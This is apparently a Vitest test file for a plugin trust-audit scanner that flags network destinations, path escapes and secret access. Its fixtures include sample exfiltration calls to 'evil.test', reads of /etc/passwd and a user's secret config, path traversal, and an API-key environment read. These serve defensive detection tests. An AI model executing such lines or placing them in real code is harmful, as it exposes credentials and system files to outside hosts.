import { describe, expect, it } from 'vitest'
import { auditPlugin } from '../../src/core/audit.ts'
import { scanShape, shapeRedLines } from '../../src/core/shape.ts'
import { scoreTrust } from '../../src/core/score.ts'
import type { PluginInput } from '../../src/core/types.ts'

function input(sources: Record<string, string>): PluginInput {
  return {
    manifest: { name: 'shape-test', version: '1.0.0' },
    sources,
    skillFiles: {},
    patchText: undefined,
    patchPath: undefined,
    spec: 'dir:.',
  }
}

describe('scanShape', () => {
  it('ignores same-origin HTTP relative routes as destinations', () => {
    const { destinations, pathEscapes } = scanShape(input({
      'client.js': 'await fetch("/dsh-trust-check/audit")',
    }))
    expect(destinations.some(d => d.value === '/dsh-trust-check/audit')).toBe(false)
    expect(pathEscapes).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('records https host without red line', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("https://api.github.com/repos/x")',
    }))
    expect(destinations.some(d => d.kind === 'https-host' && d.value === 'api.github.com')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('flags plaintext http host as red line when network present', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("http://evil.test/leak")',
    }))
    const lines = shapeRedLines(['network'], destinations)
    expect(lines.some(l => l.startsWith('uses plaintext http://'))).toBe(true)
  })

  it('flags non-loopback literal IP with network', () => {
    const { destinations } = scanShape(input({
      'a.js': 'const u = "203.0.113.1/api"',
    }))
    const lines = shapeRedLines(['network'], destinations)
    expect(lines.some(l => l.startsWith('uses literal IP'))).toBe(true)
  })

  it('skips private IP range-table boundaries (SSRF denylist)', () => {
    const { destinations } = scanShape(input({
      'a.js': 'return inRange(value, "10.0.0.0", "10.255.255.255") || inRange(value, "192.168.0.0", "192.168.255.255")',
    }))
    expect(destinations.filter(d => d.kind === 'ip')).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('still records a lone literal IP used as a destination', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("http://203.0.113.50/x")',
    }))
    // http URL takes host path; also ensure raw IP on its own line is kept
    const alone = scanShape(input({ 'b.js': 'const host = "203.0.113.50"' }))
    expect(alone.destinations.some(d => d.kind === 'ip' && d.value === '203.0.113.50')).toBe(true)
    expect(destinations.some(d => d.kind === 'http-host' && d.value === '203.0.113.50')).toBe(true)
  })

  it('skips placeholder URL bases and example hosts', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        'new URL(request.url ?? "", "http://local")',
        'fetch("https://dav.example/x")',
        'citations:["https://..."]',
        '/* https://host/app/ and https://proxy/https://github.com/o/r.git */',
      ].join('\n'),
    }))
    expect(destinations.some(d => d.value === 'local' || d.value.includes('example'))).toBe(false)
    expect(destinations.some(d => d.value === '...' || /^\.+$/.test(d.value))).toBe(false)
    expect(destinations.some(d => d.value === 'host' || d.value === 'proxy')).toBe(false)
  })

  it('records filesystem absolute paths as path escapes, not destinations', () => {
    const { destinations, pathEscapes } = scanShape(input({
      'a.js': [
        "spawn(COMSPEC, ['/d', '/s', '/c', cmd])",
        "dirs.push('/opt/homebrew/bin', '/usr/local/bin')",
        'await fetch("/dsh-market/check")',
        'readFileSync("/Users/alice/.config/secret")',
        'open("~/Documents/x")',
        'join("../../../etc/passwd")',
      ].join('\n'),
    }))
    expect(destinations.some(d => d.value === '/c' || d.value.startsWith('/opt/') || d.value.startsWith('/usr/'))).toBe(false)
    expect(destinations.some(d => d.value === '/dsh-market/check')).toBe(false)
    expect(pathEscapes.some(p => p.kind === 'absolute' && p.value === '/opt/homebrew/bin')).toBe(true)
    expect(pathEscapes.some(p => p.kind === 'absolute' && p.value === '/usr/local/bin')).toBe(true)
    expect(pathEscapes.some(p => p.kind === 'absolute' && p.value.startsWith('/Users/'))).toBe(true)
    expect(pathEscapes.some(p => p.kind === 'home' && p.value.startsWith('~/'))).toBe(true)
    expect(pathEscapes.some(p => p.kind === 'traversal')).toBe(true)
  })

  it('skips template http hosts that are not literals', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch(`http://${host}/x`)',
    }))
    expect(destinations.some(d => d.kind === 'http-host')).toBe(false)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('captures sensitive env key names', () => {
    const { secretTouches } = scanShape(input({
      'a.js': 'const k = process.env.OPENAI_API_KEY',
    }))
    expect(secretTouches.some(s => s.kind === 'env-key' && s.value === 'OPENAI_API_KEY')).toBe(true)
  })
})

describe('auditPlugin shape integration', () => {
  it('does not list relative audit fetch as destination or path escape', () => {
    const report = auditPlugin(input({
      'client.js': [
        'import { readFileSync } from "fs"',
        'await fetch("/dsh-trust-check/audit")',
      ].join('\n'),
    }))
    expect(report.capabilities).toContain('network')
    expect(report.destinations.some(d => d.value === '/dsh-trust-check/audit')).toBe(false)
    expect(report.pathEscapes.some(p => p.value === '/dsh-trust-check/audit')).toBe(false)
    expect(report.redLines).toEqual([])
  })

  it('surfaces path escapes in the report', () => {
    const report = auditPlugin(input({
      'a.js': 'readFileSync("/etc/passwd")',
    }))
    expect(report.pathEscapes.some(p => p.kind === 'absolute' && p.value === '/etc/passwd')).toBe(true)
  })

  it('red-lines http evil host with network', () => {
    const report = auditPlugin(input({
      'a.js': 'fetch("http://evil.test/x")',
    }))
    expect(report.redLines.some(l => l.startsWith('uses plaintext http://'))).toBe(true)
    expect(report.band).toBe('red')
  })
})

describe('scoreTrust destinations', () => {
  it('merges shape red lines', () => {
    const result = scoreTrust({
      capabilities: ['network'],
      destinations: [{ kind: 'http-host', value: 'evil.test', file: 'a.js', line: 1 }],
      injectedTokensEstimate: 0,
      injections: [],
      hasBuildScript: false,
      buildScripts: [],
      repository: 'https://github.com/x/y',
      pinned: true,
    })
    expect(result.redLines.some(l => l.includes('evil.test'))).toBe(true)
  })
})
